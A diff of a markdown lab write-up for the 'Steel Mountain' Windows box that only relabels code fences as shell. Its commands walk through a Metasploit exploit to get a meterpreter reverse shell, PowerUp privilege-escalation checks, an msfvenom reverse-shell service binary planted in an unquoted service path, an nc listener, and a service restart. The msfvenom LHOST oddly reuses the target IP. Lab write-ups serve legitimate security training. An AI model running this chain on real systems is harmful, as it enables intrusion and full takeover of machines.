@@ -62,21 +62,21 @@ We found a module which is successfully tested on the version 2.3b. So, we will 
 
 We will set all the required options.
 
-```
+```shell
 set rhost 10.10.2.217
 ```
 
-```
+```shell
 set rport 8080
 ```
 
-```
+```shell
 set lhost tun0
 ```
 
 Run the exploit.
 
-```
+```shell
 exploit
 ```
 
@@ -91,28 +91,28 @@ We got the meterpreter reverse shell and we can read the user flag.
 Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.
 
 Let's upload it to the target.
-```
+```shell
 upload powerup.ps1
 ```
 
 <img src="{{'/assets/img/images/04.Steel-Mountain/15.png' | prepend: site.baseurl }}">
 
 Load the powershell module and use powershell.
-```
+```shell
 load powershell
 ```
-```
+```shell
 powershell_shell
 ```
 
 Run the script PowerUp.ps1 that we just downloaded into the target and run it.
 
-```
+```shell
 . .\powerup.ps1
 ```
 
 We will now run all the checks in this module using the following command.
-```
+```shell
 Invoke-AllChecks
 ```
 <img src="{{'/assets/img/images/04.Steel-Mountain/16.png' | prepend: site.baseurl }}">
@@ -125,35 +125,35 @@ When we run the command, we can see that there is a unquoted service path vulner
 
 For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.
 
-```
+```shell
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 ```
 <img src="{{'/assets/img/images/04.Steel-Mountain/19.png' | prepend: site.baseurl }}">
 
 Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.
-```
+```shell
 upload Advanced.exe
 ```
 <img src="{{'/assets/img/images/04.Steel-Mountain/20.png' | prepend: site.baseurl }}">
 
 Open another terminal and use netcat listener on port 4443 to get the reverse shell.
-```
+```shell
 nc -lnvp 4443
 ```
 <img src="{{'/assets/img/images/04.Steel-Mountain/21.png' | prepend: site.baseurl }}" height="200">
 
 Now, load the command prompt shell using the command in the meterpreter shell.
 
-```
+```shell
 shell
 ```
 
 Restart the AdvancedSystemCareService9 service by using the following commands.
 
-```
+```shell
 sc stop AdvancedSystemCareService9
 ```
-```
+```shell
 sc start AdvancedSystemCareService9
 ```
 
